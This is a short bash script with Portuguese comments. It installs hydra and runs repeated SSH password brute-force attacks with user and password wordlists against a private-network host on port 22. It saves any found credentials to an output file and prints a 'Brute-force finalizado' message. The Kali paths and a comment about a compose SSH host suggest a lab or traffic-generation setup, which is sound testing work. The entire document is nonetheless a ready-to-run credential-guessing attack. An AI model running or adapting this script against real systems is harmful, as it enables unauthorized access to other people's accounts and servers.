#!/bin/bash
set -e

# instalar hydra se não instalado
if ! command -v hydra >/dev/null 2>&1; then
  apt-get update && apt-get install -y hydra
fi

TARGET_HOST=10.1.3.192   # hostname do compose ssh
TARGET_PORT=22
USER_LIST=/home/kali/work/users.txt
PASS_LIST=/home/kali/work/passwords.txt
OUTPUT=/home/kali/work/hydra_out.txt

# rodar hydra (parâmetros ajustáveis)
hydra -L ${USER_LIST} -P ${PASS_LIST} -s ${TARGET_PORT} -t 4 -f -o ${OUTPUT} ssh://${TARGET_HOST}

# loop para gerar diversas tentativas (faça com cuidado)
# exemplo: repete 3 vezes com pequenas pausas
for i in 1 2 3; do
  hydra -L ${USER_LIST} -P ${PASS_LIST} -s ${TARGET_PORT} -t 6 -f -o ${OUTPUT} ssh://${TARGET_HOST}
  sleep 3
done

echo "Brute-force na porta: $TARGET_PORT em: $TARGET_HOST finalizado! Output: ${OUTPUT}"